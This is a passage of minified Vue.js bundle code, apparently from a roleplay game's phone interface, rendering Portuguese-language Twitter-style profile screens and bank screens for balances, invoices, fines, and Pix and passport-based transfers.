        src: l.profile.bannerURL
    }, null, 8, ["src"]), Pl("img", {
        class: ["absolute left-8 top-36 w-36 h-36 rounded-full border-4", [l.dark ? "border-black" : "border-white"]],
        src: null == (o = l.profile) ? void 0 : o.avatarURL,
        alt: ""
    }, null, 10, ["src"])]), Pl("div", qy, [(null == (r = l.mine) ? void 0 : r.id) == l.profile.id ? (wl(), _l("button", {
        key: 0,
        onClick: t[1] || (t[1] = t => e.$router.push("/twitter/settings")),
        class: "mr-4 px-6 rounded-full text-twitter border border-twitter"
    }, "Editar perfil")) : l.profile.isFollowed ? (wl(), _l("button", {
        key: 1,
        onClick: t[2] || (t[2] = (...e) => l.unfollow && l.unfollow(...e)),
        class: "mr-4 px-6 rounded-full text-twitter border border-twitter"
    }, "Deixar de seguir")) : (wl(), _l("button", {
        key: 2,
        onClick: t[3] || (t[3] = (...e) => l.follow && l.follow(...e)),
        class: "mr-4 px-6 rounded-full text-twitter border border-twitter"
    }, "Seguir"))]), Pl("div", Gy, [Pl("div", Wy, [Pl("h1", Ky, g(l.profile.name), 1), l.profile.verified ? (wl(), _l(u, {
        key: 0,
        class: "ml-2 w-6 h-6"
    })) : Ml("", !0)]), Pl("h3", Jy, "@" + g(l.profile.username), 1), Pl("p", Xy, g(l.profile.bio), 1), Pl("div", Yy, [Pl("p", null, [Pl("b", null, g(null != (i = l.profile.following) ? i : 0), 1), Zy, Qy]), Pl("p", ek, [Pl("b", null, g(null != (c = l.profile.followers) ? c : 0), 1), tk, nk])])]), Pl(d, {
        all: l.posts
    }, null, 8, ["all"])])) : Ml("", !0)])
};
const lk = Ze({}),
    ak = {
        components: {
            Header: Ox
        },
        setup() {
            lk.id || Object.assign(lk, Ix.value);
            const e = jl("alert"),
                t = jl("prompt"),
                n = da((() => {
                    for (let [e, t] of Object.entries(Ix.value))
                        if (t != lk[e]) return !0
                }));
            return {
                dark: _o.darkTheme,
                form: lk,
                save: function() {
                    _o.backend.twitter_save(lk).then((t => {
                        if (t.error) return e(t.error);
                        Object.assign(lk, t), Object.assign(Ix.value, t)
                    }))
                },
                changeAvatar: async function() {
                    try {
                        const e = await _o.useAnyImage("/twitter", !0);
                        lk.avatarURL = e
                    } catch (e) {}
                },
                changeBanner: function() {
                    t("Link da imagem").then((e => {
                        if (e) {
                            const t = new Image;
                            t.onload = () => lk.bannerURL = e, t.src = e
                        }
                    }))
                },
                hasChanges: n
            }
        }
    },
    sk = sn("data-v-1576647c");
ln("data-v-1576647c");
const ok = {
        class: "h-full text-theme bg-theme"
    },
    rk = {
        class: "h-32 pb-4 border-b border-theme flex items-end"
    },
    ik = Pl("i", {
        class: "far text-2xl fa-arrow-left"
    }, null, -1),
    ck = Pl("h1", null, "Editar perfil", -1),
    uk = {
        class: "relative"
    },
    dk = {
        class: "relative w-full"
    },
    pk = Pl("i", {
        class: "fas fa-camera opacity-75"
    }, null, -1),
    fk = {
        class: "absolute left-8 top-36 flex flex-center"
    },
    mk = Pl("i", {
        class: "fas fa-camera opacity-75"
    }, null, -1),
    hk = {
        class: "px-5 mt-20"
    },
    bk = {
        class: "mb-4 flex flex-col"
    },
    gk = Pl("label", null, "Nome", -1),
    vk = {
        class: "mb-4 flex flex-col"
    },
    xk = Pl("label", null, "Nome de usuário", -1),
    yk = {
        class: "mb-4 flex flex-col"
    },
    kk = Pl("label", null, "Bio", -1);
an();
const wk = sk(((e, t, n, l, a, s) => {
    var o;
    return wl(), _l("div", ok, [Pl("div", rk, [Pl("button", {
        onClick: t[1] || (t[1] = (...t) => e.$router.back && e.$router.back(...t)),
        class: "px-5 text-twitter"
    }, [ik]), ck, l.hasChanges ? (wl(), _l("button", {
        key: 0,
        onClick: t[2] || (t[2] = (...e) => l.save && l.save(...e)),
        class: "ml-auto text-twitter text-2xl px-5"
    }, "Salvar")) : Ml("", !0)]), Pl("div", uk, [Pl("div", dk, [Pl("button", {
        onClick: t[3] || (t[3] = (...e) => l.changeBanner && l.changeBanner(...e)),
        class: "absolute inset-0 w-full text-center text-white"
    }, [pk]), Pl("img", {
        class: "h-56 w-full",
        src: null == (o = l.form) ? void 0 : o.bannerURL,
        alt: ""
    }, null, 8, ["src"])]), Pl("div", fk, [Pl("button", {
        onClick: t[4] || (t[4] = (...e) => l.changeAvatar && l.changeAvatar(...e)),
        class: "absolute inset-0 w-full rounded-full text-center text-white"
    }, [mk]), Pl("img", {
        class: ["w-36 h-36 rounded-full border-4", [l.dark ? "border-black" : "border-white"]],
        src: l.form.avatarURL,
        alt: ""
    }, null, 10, ["src"])])]), Pl("div", hk, [Pl("div", bk, [gk, Zn(Pl("input", {
        maxlength: "24",
        "onUpdate:modelValue": t[5] || (t[5] = e => l.form.name = e),
        class: "border-b border-theme p-1"
    }, null, 512), [
        [ns, l.form.name]
    ])]), Pl("div", vk, [xk, Zn(Pl("input", {
        maxlength: "16",
        "onUpdate:modelValue": t[6] || (t[6] = e => l.form.username = e),
        class: "border-b border-theme p-1"
    }, null, 512), [
        [ns, l.form.username]
    ])]), Pl("div", yk, [kk, Zn(Pl("input", {
        maxlength: "255",
        "onUpdate:modelValue": t[7] || (t[7] = e => l.form.bio = e),
        class: "border-b border-theme p-1"
    }, null, 512), [
        [ns, l.form.bio]
    ])])])])
}));
ak.render = wk, ak.__scopeId = "data-v-1576647c";
const Ck = new Map;

function _k(e, t) {
    let n, l;
    Array.isArray(e) ? [n, l] = e : (n = () => e.value, l = t => e.value = t);
    const a = [];
    let s = Math.floor((n() - t) / 23);
    0 == s && l(t);
    for (let o = 25; o <= 600; o += 25) a.push(setTimeout((() => {
        l(600 == o ? t : n() - s), 600 == o && Ck.delete(e)
    }), o));
    Ck.set(e, (() => {
        a.forEach(clearTimeout), l(t)
    }))
}
const Ak = {
    setup() {
        const e = rt();
        let t, n, l = !1;
        return {
            container: e,
            down: function(a) {
                l = !0, t = a.pageX - e.value.offsetLeft, n = e.value.scrollLeft
            },
            up: function() {
                l = !1
            },
            move: function(a) {
                if (!l) return;
                a.preventDefault();
                const s = .75 * (a.pageX - e.value.offsetLeft - t);
                e.value.scrollLeft = n - s
            }
        }
    }
};
Ak.render = function(e, t, n, l, a, s) {
    return wl(), _l("div", {
        class: "overflow-x-auto hide-scroll",
        ref: "container",
        onMousedown: t[1] || (t[1] = is(((...e) => l.down && l.down(...e)), ["stop", "prevent"])),
        onMouseup: t[2] || (t[2] = (...e) => l.up && l.up(...e)),
        onMouseleave: t[3] || (t[3] = (...e) => l.up && l.up(...e)),
        onMousemove: t[4] || (t[4] = (...e) => l.move && l.move(...e))
    }, [Zt(e.$slots, "default")], 544)
};
const Sk = rt(),
    Rk = {
        props: {
            header: {
                default: !0
            }
        },
        components: {
            HorizontalScroll: Ak
        },
        setup() {
            const e = da((() => _o.settings.bankType)),
                t = da((() => _o.settings.bankLogo)),
                n = da((() => {
                    var e;
                    return !(null == (e = _o.settings.disabledApps) ? void 0 : e.includes("invoice"))
                }));
            return null == Sk.value && _o.backend.bank_hasPix().then((e => Sk.value = e)), {
                pix: Sk,
                bankType: e,
                bankLogo: t,
                hasInvoices: n
            }
        }
    },
    Tk = {
        key: 0,
        class: "h-12 bank-dark"
    },
    Ek = {
        key: 1,
        class: "h-20 flex-shrink-0 pt-4 text-center"
    },
    Pk = {
        key: 1,
        class: "relative-white flex justify-center"
    },
    Lk = Pl("img", {
        class: "w-16",
        src: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAAAwCAYAAAChS3wfAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAATxSURBVGhD7ZpbqFRVGMf3PnYsDQNJSysTooumlFKCJSHdoAfDLkQEZURhVNBDUBqUPfRSEPXSS4RQEJiRZJ0CLQuyjKIw1ETNSjllJZplF7OLs/r91/r2NHNm75k5Z8Zp72b+8OPb+1uXWWvttfbazLfiqEm5kuuP4uhGLq+HWTBRbvgBtsNHsBbPh3FfXOL6/yPn3FmwBZrRLlgCJ1jxYksdga9A+hLuhdlwCkyG6XA1PAoboQTSPrirVHJ9VlUxRSce8N1xbhM0fKrkmQUr4QhIb8MkSy6eaPxbvhvOaf03LfLPh92+ZLDnWFKxRMP15KU55mpalJkAG3xp576B0y2pOKLRW33znbvQXMMS5cbBx76GYEdbUi5Usw3SwLGYeXCSd0TR43AqPAy75KjQ37ATNsVxfMR7UkSdUzCfwomwlLyqs0rkkZkLGui07fkArKbsb+G2vqjvGMwC0G+n6XO27Dft2hcYBffBfhiutDssgszvCtJuV0Z0AMaZuyx8Sk92kCxpBvVbkboi3wpfor6e8A3m4ljMi3CN7tEO2Ap6LFeC3v7vwI9QKc2WCyCZLcthMU+p5kOI39AT2QZnwm3keU7+RKRrhugD6z3YLV+FtJWqbcfDfMqulzNL1KWPtL26hFVwGCo1HjQ7fvd3FHgGpINwE5T3bq7rvgPwj4a74ZAyoUcsqUakPRSyuBXmKgvfjpDkppurSvjXhmR3lbkyRZ4zQlb3vbmqhL8vJLPu4BLQ1PtD15anLHxNvQRJXwDa+w9D6tse/zyQPjNXWfiSAZhmrirhXxOS2zIAcUgOT/oe0FJ4iqml6TciUfZ1zCug5bRIvhQlU3uC2f9cGoCLw2X0vNlWtNJsUudQ/Wl2lNk0+e2gU9IA6EUm7TPbigbN6iU0UmXuJEdD5Zddm9TRp9cOtXsACqfeAJjtWvUGwGzXqjcAZrtWvQEw27XqDYDZrlVvAMx2rfI3AM7/odIx5XEGdLRN7f6x1v8P6OjfIe0fgA43v3XlcQlkKZldbW1z/pZAtpL/LKeabUXJv9KH8rQEkthiVh0bzN7gQhyxFd1q9oM8LYHkCWcFM1+Cn+FSuEWOkYjBOx+zLNxFTx+tJZD1FOvNkC1mLzNbpTiOFZd8MNxFy+mITq6MsfuGIq+iQYoHrgMFZ1fR2tfk/Jqb0yzhO6iUIrE6FSY7jUYoaJop6pqBUdjrL3gZFD6v1GS4Agapq2otW+MGQDNhKukhcFkhdQKj0Pr93hFC5p/AL/7uXymIqhCagqJvgMqdDTNBUqB3Ib/xqyrVia5GWuNK2aHvRMpD3nWhSF0lHSiLsv34B0OyW2LuGpEmroMkZjkc/QTLoBxiV4Nlta709NI6+S0MMFpJWKuuqO84zEJIQuaV0o9pqr9Lfd5RKcregXkWdAhiDnkUTk8VebV8zzWGnhnQbz8JB0GxT0mz5X3qHDpb8iN1CpIZtB1GFESlXN3ocK5FoyfCTt985zaD3k/DEmWSAdhjrmKJhk+Bbb4LPEXQ2QNLbSzyXq6CaKO5iicaPx5W+26EAxwDMBcsR7pIHwPrQao5jFUo0QG9pG+GPeqNSW//x+BamAk6sjsJzoM7Idkd9sLJVlWxRUfGgs4o68XYjL4AffE1VMO9PU+iU2qvTqXpI+ci0HkibXnaEvfDZngVXmC7G3oyLEVR9A/5Q6Q0mcHOXwAAAABJRU5ErkJggg==",
        alt: ""
    }, null, -1),
    Ik = {
        key: 2,
        class: "relative-white flex items-center justify-center"
    },
    Ok = Pl("svg", {
        class: "h-8 w-16",
        xmlns: "http://www.w3.org/2000/svg",
        version: "1.0",
        width: "270px",
        height: "136px",
        viewBox: "0 0 270 136",
        preserveAspectRatio: "xMidYMid meet"
    }, [Pl("g", {
        fill: "#ffffff"
    }, [Pl("path", {
        d: "M177.3 134.5 c-13.5 -2.9 -24.7 -11.8 -30.5 -24.1 -5.5 -11.7 -5.9 -16 -6.5 -63 l-0.6 -43.2 12.4 -0.7 c6.8 -0.4 15.1 -0.5 18.4 -0.3 l6 0.3 0.5 43.5 c0.6 47.1 0.5 46.4 6.5 56.6 5.3 9.1 17.8 16.8 29 18 9.2 0.9 9.4 1.1 4.2 4.8 -6.4 4.5 -13.1 7.3 -20.8 8.5 -8 1.3 -10.8 1.3 -18.6 -0.4z"
    }), Pl("path", {
        d: "M0 92.2 c0 -42.3 0.3 -46.1 5.1 -55.4 4.4 -8.6 15.8 -17.7 26.6 -21.1 5.3 -1.7 16.3 -3.3 16.3 -2.3 0 0.3 -1.5 2.6 -3.4 5.1 -1.9 2.4 -4.5 7 -5.8 10.2 -2.3 5.8 -2.3 6.2 -2.6 54.6 l-0.3 48.7 -18 0 -17.9 0 0 -39.8z"
    }), Pl("path", {
        d: "M93 91.2 c0 -44.3 -0.3 -47.5 -5.7 -57.4 -5.5 -10 -18 -18.1 -29.8 -19.4 -9.2 -0.9 -9.4 -1.1 -4.2 -4.8 15 -10.7 34.3 -12.2 50.7 -4 8.2 4.1 14.6 10.8 19 19.7 5.5 11.3 6 16.1 6.7 63.5 l0.6 43.2 -18.7 0 -18.6 0 0 -40.8z"
    }), Pl("path", {
        d: "M222 122.6 c0 -0.3 1.5 -2.6 3.4 -5.1 1.9 -2.4 4.5 -7 5.8 -10.2 2.3 -5.8 2.3 -6.2 2.6 -54.5 l0.3 -48.8 18 0 17.9 0 0 39.8 c0 42.4 -0.3 46.1 -5.1 55.5 -4.5 8.8 -16.6 18.2 -27.9 21.5 -4.4 1.4 -15 2.6 -15 1.8z"
    })])], -1),
    Mk = {
        key: 3,
        class: "font-bold text-4xl"
    },
    Vk = {
        key: 5,
        class: "h-16 mt-4 mx-auto",
        src: "https://i.imgur.com/BC78tFD.png"
    },
    Dk = {
        key: 9,
        class: "h-20 mx-auto",
        src: "https://logodownload.org/wp-content/uploads/2014/05/itau-logo-1.png"
    },
    Uk = Pl("svg", {
        xmlns: "http://www.w3.org/2000/svg",
        width: "2.25rem",
        height: "2.25rem",
        viewBox: "0 0 2500 2500"
    }, [Pl("g", {
        fill: "rgb(255,255,255)",
        style: {
            transform: "none",
            "--darkreader-inline-fill": "#e8e6e3"
        },
        "data-darkreader-inline-fill": ""
    }, [Pl("g", null, [Pl("path", {
        d: "M1165 2486 c-107 -28 -123 -40 -393 -309 -263 -262 -263 -262 -185 -269 141 -12 169 -30 413 -272 118 -118 225 -219 238 -225 16 -9 28 -9 45 0 12 6 117 105 232 220 236 234 278 263 400 275 67 7 67 7 -172 246 -131 132 -255 253 -275 269 -75 60 -211 89 -303 65z m176 -113 c48 -15 74 -37 242 -202 103 -101 187 -187 187 -190 0 -3 -20 -15 -43 -25 -28 -13 -112 -88 -254 -230 -213 -210 -213 -210 -430 5 -171 169 -228 220 -265 235 -27 10 -48 22 -48 25 0 3 82 86 183 185 156 154 189 182 232 196 65 22 130 22 196 1z"
    }), Pl("path", {
        d: "M223 1628 c-211 -213 -217 -225 -217 -383 0 -158 6 -170 217 -383 172 -174 172 -174 297 -170 106 4 132 8 170 28 28 14 124 102 250 228 113 112 219 213 235 223 38 24 124 25 167 3 17 -9 126 -111 242 -227 151 -150 224 -216 256 -230 33 -15 74 -22 150 -25 105 -4 105 -4 282 176 169 172 177 182 197 245 30 100 34 130 21 193 -23 112 -41 138 -223 322 -172 174 -172 174 -277 170 -78 -3 -117 -9 -150 -24 -32 -15 -107 -82 -256 -231 -116 -116 -225 -218 -242 -227 -43 -22 -129 -21 -167 3 -16 10 -124 113 -240 228 -126 126 -226 217 -250 228 -31 15 -68 20 -165 23 -125 4 -125 4 -297 -170z m423 49 c17 -9 125 -110 240 -224 209 -208 209 -208 -1 -417 -116 -114 -223 -215 -240 -223 -18 -10 -66 -18 -120 -21 -90 -4 -90 -4 -236 145 -90 91 -153 163 -163 187 -22 52 -22 190 0 242 10 24 73 96 163 187 146 149 146 149 236 145 57 -3 101 -10 121 -21z m1560 -129 c131 -134 152 -160 167 -207 21 -67 21 -109 0 -185 -16 -56 -26 -69 -166 -213 -147 -151 -150 -153 -193 -153 -24 0 -67 5 -96 11 -51 11 -60 18 -271 227 -217 217 -217 217 -5 430 233 233 244 240 359 241 56 1 56 1 205 -151z"
    }), Pl("path", {
        d: "M1011 865 c-259 -256 -284 -273 -424 -283 -79 -5 -79 -5 160 -244 131 -132 258 -254 283 -273 89 -66 221 -83 346 -44 68 21 68 21 337 288 269 266 269 266 210 273 -32 4 -87 20 -123 34 -59 25 -86 48 -291 251 -163 162 -232 223 -249 223 -16 0 -85 -62 -249 -225z m458 -99 c148 -148 217 -210 252 -227 27 -12 49 -25 49 -29 0 -4 -84 -90 -188 -192 -186 -183 -188 -185 -254 -203 -45 -12 -82 -16 -114 -11 -92 12 -129 38 -310 218 -96 94 -174 174 -173 177 0 3 26 18 57 33 45 22 99 69 262 233 113 113 207 205 210 205 3 0 97 -92 209 -204z"
    })])])], -1),
    Nk = Pl("span", {
        class: "text-2xl"
    }, "Pix", -1),
    $k = Pl("i", {
        class: "fal fa-usd-circle"
    }, null, -1),
    jk = Pl("span", {
        class: "text-2xl"
    }, "Transferir", -1),
    Fk = Pl("i", {
        class: "fal fa-file-invoice-dollar"
    }, null, -1),
    zk = Pl("span", {
        class: "text-2xl"
    }, "Extrato", -1),
    Bk = Pl("i", {
        class: "fal fa-user-friends"
    }, null, -1),
    Hk = Pl("span", {
        class: "text-2xl"
    }, "Cobrar", -1),
    qk = Pl("i", {
        class: "fal fa-file-invoice"
    }, null, -1),
    Gk = Pl("span", {
        class: "text-2xl"
    }, "Faturas", -1),
    Wk = Pl("i", {
        class: "fal fa-gavel"
    }, null, -1),
    Kk = Pl("span", {
        class: "text-2xl"
    }, "Multas", -1);
Rk.render = function(e, t, n, l, a, s) {
    const o = dl("HorizontalScroll");
    return wl(), _l("div", {
        class: "flex flex-col h-full",
        bankType: l.bankType
    }, [null != n.header ? (wl(), _l("div", Tk)) : Ml("", !0), n.header ? (wl(), _l("div", Ek, [l.bankLogo ? (wl(), _l("img", {
        key: 0,
        class: "h-20 mx-auto",
        src: l.bankLogo
    }, null, 8, ["src"])) : "nubank" == l.bankType ? (wl(), _l("div", Pk, [Lk])) : "nubank2" == l.bankType ? (wl(), _l("div", Ik, [Ok])) : "southBank" == l.bankType ? (wl(), _l("h1", Mk, "SouthBank")) : "fleeca" == l.bankType ? (wl(), _l("img", {
        key: 4,
        class: "h-12 mx-auto",
        src: e.$asset("stock/fleeca.png"),
        alt: ""
    }, null, 8, ["src"])) : "nxbank" == l.bankType ? (wl(), _l("img", Vk)) : "CPBank" == l.bankType ? (wl(), _l("img", {
        key: 6,
        class: "h-12 mt-4 mx-auto",
        src: e.$asset("apps/cpbank.svg")
    }, null, 8, ["src"])) : "picpay" == l.bankType ? (wl(), _l("img", {
        key: 7,
        class: "h-14 mt-2 mx-auto",
        src: e.$asset("stock/picpay.svg")
    }, null, 8, ["src"])) : "bdc" == l.bankType ? (wl(), _l("img", {
        key: 8,
        class: "h-24 mx-auto",
        src: e.$asset("apps/bdc.svg")
    }, null, 8, ["src"])) : "itau" == l.bankType ? (wl(), _l("img", Dk)) : Ml("", !0)])) : Ml("", !0), Zt(e.$slots, "default"), "/bank" == e.$route.path ? (wl(), _l(o, {
        key: 2,
        class: "mt-auto flex flex-shrink-0 flex-no-shrink h-52 py-5 mx-5 text-4xl"
    }, {
        default: en((() => [l.pix ? (wl(), _l("div", {
            key: 0,
            onClick: t[1] || (t[1] = t => e.$router.push("/bank/pix")),
            class: "w-40 p-4 flex flex-col justify-between text-white bank-light rounded-lg mr-6"
        }, [Uk, Nk])) : Ml("", !0), Pl("div", {
            onClick: t[2] || (t[2] = t => e.$router.push("/bank/transfer")),
            class: "w-40 p-4 flex flex-col justify-between text-white bank-light rounded-lg mr-6"
        }, [$k, jk]), Pl("div", {
            onClick: t[3] || (t[3] = t => e.$router.push("/bank/statements")),
            class: "w-40 p-4 flex flex-col justify-between text-white bank-light rounded-lg mr-6"
        }, [Fk, zk]), l.hasInvoices ? (wl(), _l("div", {
            key: 1,
            onClick: t[4] || (t[4] = t => e.$router.push("/bank/invoices/create")),
            class: "w-40 p-4 flex flex-col justify-between text-white bank-light rounded-lg mr-6"
        }, [Bk, Hk])) : Ml("", !0), l.hasInvoices ? (wl(), _l("div", {
            key: 2,
            onClick: t[5] || (t[5] = t => e.$router.push("/bank/invoices")),
            class: "w-40 p-4 flex flex-col justify-between text-white bank-light rounded-lg mr-6"
        }, [qk, Gk])) : Ml("", !0), Pl("div", {
            onClick: t[6] || (t[6] = t => e.$router.push("/bank/fines")),
            class: "w-40 p-4 flex flex-col justify-between text-white bank-light rounded-lg mr-6"
        }, [Wk, Kk])])),
        _: 1
    })) : Ml("", !0)], 8, ["bankType"])
};
const Jk = {
        components: {
            Page: Rk
        },
        setup() {
            jl("setDark")(!0), jl("alert");
            const e = _o.identity,
                t = rt(!0),
                n = rt(0),
                l = rt(0),
                a = rt(0),
                s = rt(_o.hasNotificationFor("bank"));
            return _o.backend.bank_index().then((e => {
                n.value = e.balance, a.value = e.fines, l.value = e.invoices
            })), Rn(s, (e => _o.setNotificationFor("bank", e))), _o.onceRoute("BANK", (({
                value: e
            }) => _k(n, n.value + e))), {
                identity: e,
                notifications: s,
                visible: t,
                balance: n,
                invoices: l,
                fines: a
            }
        }
    },
    Xk = {
        class: "p-5 flex-1 flex flex-col"
    },
    Yk = {
        class: "flex justify-between items-center"
    },
    Zk = {
        class: "text-5xl font-bold relative-white"
    },
    Qk = {
        class: "flex"
    },
    ew = {
        class: "mt-6 p-8 bg-white rounded-lg"
    },
    tw = Pl("span", {
        class: "block mb-5 text-gray-600"
    }, [Pl("i", {
        class: "fal fa-coins"
    }), Pl("span", {
        class: "ml-5"
    }, "Conta")], -1),
    nw = Pl("h1", {
        class: "text-gray-600 text-3xl mb-5"
    }, "Saldo disponível", -1),
    lw = {
        key: 0,
        class: "text-6xl h-16 font-bold"
    },
    aw = {
        key: 1,
        class: "bg-gray-200 h-16"
    },
    sw = {
        class: "mt-6 p-8 bg-white rounded-lg"
    },
    ow = Pl("span", {
        class: "block mb-5 text-gray-600"
    }, [Pl("i", {
        class: "fal fa-file-invoice"
    }), Pl("span", {
        class: "ml-5"
    }, "Faturas")], -1),
    rw = Pl("h1", {
        class: "text-gray-600 text-3xl mb-5"
    }, "Fatura atual", -1),
    iw = {
        key: 0,
        class: "text-6xl h-16 font-bold text-red-600"
    },
    cw = {
        key: 1,
        class: "bg-gray-200 h-16"
    },
    uw = {
        class: "mt-6 p-8 bg-white rounded-lg"
    },
    dw = Pl("span", {
        class: "block mb-5 text-gray-600"
    }, [Pl("i", {
        class: "fal fa-gavel"
    }), Pl("span", {
        class: "ml-5"
    }, "Multas")], -1),
    pw = Pl("h1", {
        class: "text-gray-600 text-3xl mb-5"
    }, "Fatura atual", -1),
    fw = {
        key: 0,
        class: "text-6xl h-16 font-bold text-red-600"
    },
    mw = {
        key: 1,
        class: "bg-gray-200 h-16"
    };
Jk.render = function(e, t, n, l, a, s) {
    const o = dl("Page");
    return wl(), _l(o, null, {
        default: en((() => [Pl("div", Xk, [Pl("div", Yk, [Pl("h1", Zk, "Olá, " + g(l.identity.name), 1), Pl("div", Qk, [Pl("button", {
            onClick: t[1] || (t[1] = e => l.notifications = !l.notifications),
            class: "text-white bank-light w-16 h-16 flex flex-center rounded-full mr-2"
        }, [Pl("i", {
            class: ["far", l.notifications ? "fa-bell" : "fa-bell-slash"]
        }, null, 2)]), Pl("button", {
            onClick: t[2] || (t[2] = e => l.visible = !l.visible),
            class: "text-white bank-light w-16 h-16 flex flex-center rounded-full"
        }, [Pl("i", {
            class: ["far", l.visible ? "fa-eye" : "fa-eye-slash"]
        }, null, 2)])])]), Pl("div", null, [Pl("div", ew, [tw, nw, l.visible ? (wl(), _l("h3", lw, g(e.$filters.intToMoney(l.balance)), 1)) : (wl(), _l("div", aw))]), Pl("div", sw, [ow, rw, l.visible ? (wl(), _l("h3", iw, g(e.$filters.intToMoney(l.invoices)), 1)) : (wl(), _l("div", cw))]), Pl("div", uw, [dw, pw, l.visible ? (wl(), _l("h3", fw, g(e.$filters.intToMoney(l.fines)), 1)) : (wl(), _l("div", mw))])])])])),
        _: 1
    })
};
const hw = {
        components: {
            Page: Rk
        },
        setup() {
            jl("setDark")(!1);
            const e = Qi(),
                t = jl("alert"),
                n = rt(0),
                l = rt(0),
                a = rt("0"),
                s = rt("0");
            return Rn(a, (e => {
                const t = Number(e.replace(/\D/g, ""));
                a.value = (t > l.value ? l.value : t).toLocaleString("pt-BR")
            })), _o.backend.bank_getBalance().then((e => l.value = e)), {
                step: n,
                balance: l,
                value: a,
                key: s,
                submit: function() {
                    const n = Number(a.value.replace(/\D/g, ""));
                    _o.confirm("Deseja transferir " + js(n) + " para a chave " + s.value + "?").then((l => {
                        l && _o.lockAndProceed((() => _o.backend.bank_pix(s.value, n).then((l => {
                            l.error ? t(l.error) : e.replace({
                                path: "/bank/receipt",
                                query: {
                                    name: s.value,
                                    value: n
                                }
                            })
                        }))))
                    }))
                }
            }
        }
    },
    bw = sn("data-v-2b331752");
ln("data-v-2b331752");
const gw = {
        class: "mt-auto flex-1 bg-white relative"
    },
    vw = Pl("i", {
        class: "fal fa-times text-4xl text-gray-600"
    }, null, -1),
    xw = {
        key: 0
    },
    yw = {
        class: "p-5"
    },
    kw = Pl("h1", {
        class: "font-semibold"
    }, "Qual é o valor da transferência?", -1),
    ww = {
        class: "mt-4 text-3xl"
    },
    Cw = Il("Saldo disponível em conta "),
    _w = {
        class: "p-5 text-5xl"
    },
    Aw = {
        class: "relative"
    },
    Sw = {
        class: "absolute bottom-1.5 font-bold"
    },
    Rw = Pl("i", {
        class: "fas fa-arrow-right"
    }, null, -1),
    Tw = {
        key: 1
    },
    Ew = {
        class: "p-5"
    },
    Pw = Pl("label", {
        class: "text-gray-700 font-semibold"
    }, "Chave Pix", -1),
    Lw = {
        key: 0,
        class: "absolute inset-x-8 bottom-8"
    },
    Iw = {
        key: 2
    },
    Ow = {
        class: "p-8"
    },
    Mw = Pl("img", {
        class: "w-1/3 mb-8 bank-from-pink-filter",
        src: "https://i.imgur.com/2BHyIED.jpg"
    }, null, -1),
    Vw = Pl("h1", {
        class: "font-semibold"
    }, "Pronto, enviamos sua transferência", -1),
    Dw = {
        class: "flex flex-col items-center mt-8 p-4 py-12 border"
    },
    Uw = {
        class: "font-bold text-5xl"
    },
    Nw = {
        class: "mt-8 text-2xl"
    },
    $w = Pl("span", {
        class: "text-gray-600"
    }, "Agora mesmo", -1);
an();
const jw = bw(((e, t, n, l, a, s) => {
    const o = dl("Page");
    return wl(), _l(o, {
        header: null
    }, {
        default: bw((() => [Pl("div", gw, [Pl("button", {
            class: "p-5 mt-8",
            onClick: t[1] || (t[1] = (...t) => e.$router.back && e.$router.back(...t))
        }, [vw]), 0 == l.step ? (wl(), _l("div", xw, [Pl("div", yw, [kw, Pl("p", ww, [Cw, Pl("strong", null, g(e.$currency) + " " + g(l.balance.toLocaleString("pt-BR")), 1)])]), Pl("div", _w, [Pl("div", Aw, [Pl("span", Sw, g(e.$currency), 1), Zn(Pl("input", {
            onKeydown: t[2] || (t[2] = us((e => 0 != l.value ? l.step = 1 : null), ["enter"])),
            "onUpdate:modelValue": t[3] || (t[3] = e => l.value = e),
            class: "w-full font-bold border-b pl-20"
        }, null, 544), [
            [ns, l.value]
        ])])]), Pl("button", {
            onClick: t[4] || (t[4] = e => 0 != l.value ? l.step = 1 : null),
            class: ["absolute bottom-8 right-8 flex flex-center w-24 h-24 rounded-full", {
                "bg-gray-100 text-gray-400": 0 == l.value,
                "bank-light text-white": 0 != l.value
            }]
        }, [Rw], 2)])) : 1 == l.step ? (wl(), _l("div", Tw, [Pl("div", Ew, [Pw, Zn(Pl("input", {
            "onUpdate:modelValue": t[5] || (t[5] = e => l.key = e),
            class: "w-full mt-8 pb-2 border-b font-bold"
        }, null, 512), [
            [ns, l.key]
        ])]), l.key.trim() ? (wl(), _l("div", Lw, [Pl("button", {
            onClick: t[6] || (t[6] = (...e) => l.submit && l.submit(...e)),
            class: "w-full rounded-full bank-light text-white p-5"
        }, " Transferir para essa chave ")])) : Ml("", !0)])) : 2 == l.step ? (wl(), _l("div", Iw, [Pl("div", Ow, [Mw, Vw, Pl("div", Dw, [Pl("p", Uw, g(e.$currency) + " " + g(l.value), 1), Pl("p", null, "para " + g(e.name), 1), Pl("p", Nw, [$w, Il(" • " + g(e.time), 1)])])])])) : Ml("", !0)])])),
        _: 1
    })
}));
hw.render = jw, hw.__scopeId = "data-v-2b331752";
const Fw = {
        components: {
            Page: Rk
        },
        setup() {
            jl("setDark")(!1);
            const e = Qi(),
                t = jl("alert"),
                n = rt(0),
                l = rt(1),
                a = rt("0"),
                s = rt("0");
            return Rn(a, (e => {
                const t = Number(e.replace(/\D/g, ""));
                a.value = (t > l.value ? l.value : t).toLocaleString("pt-BR")
            })), _o.backend.bank_getBalance().then((e => l.value = e)), {
                step: n,
                balance: l,
                value: a,
                passport: s,
                submit: async function() {
                    const n = Number(a.value.replace(/\D/g, "")),
                        {
                            name: l,
                            error: o
                        } = await _o.backend.bank_confirm(s.value);
                    if (!l) return _o.alert(o);
                    _o.confirm("Deseja transferir " + js(n) + " para " + l + "?").then((a => {
                        a && _o.lockAndProceed((() => _o.backend.bank_transfer(s.value, n).then((a => {
                            a.error ? t(a.error) : e.replace({
                                path: "/bank/receipt",
                                query: {
                                    name: l,
                                    value: n
                                }
                            })
                        }))))
                    }))
                }
            }
        }
    },
    zw = sn("data-v-2062cc68");
ln("data-v-2062cc68");
const Bw = {
        class: "mt-auto flex-1 bg-white relative"
    },
    Hw = Pl("i", {
        class: "fal fa-times text-4xl text-gray-600"
    }, null, -1),
    qw = {
        key: 0
    },
    Gw = {
        class: "p-5"
    },
    Ww = Pl("h1", {
        class: "font-semibold"
    }, "Qual é o valor da transferência?", -1),
    Kw = {
        class: "mt-4 text-3xl"
    },
    Jw = Il("Saldo disponível em conta "),
    Xw = {
        class: "p-5 text-5xl"
    },
    Yw = {
        class: "relative"
    },
    Zw = {
        class: "absolute bottom-1.5 font-bold"
    },
    Qw = Pl("i", {
        class: "fas fa-arrow-right"
    }, null, -1),
    eC = {
        key: 1
    },
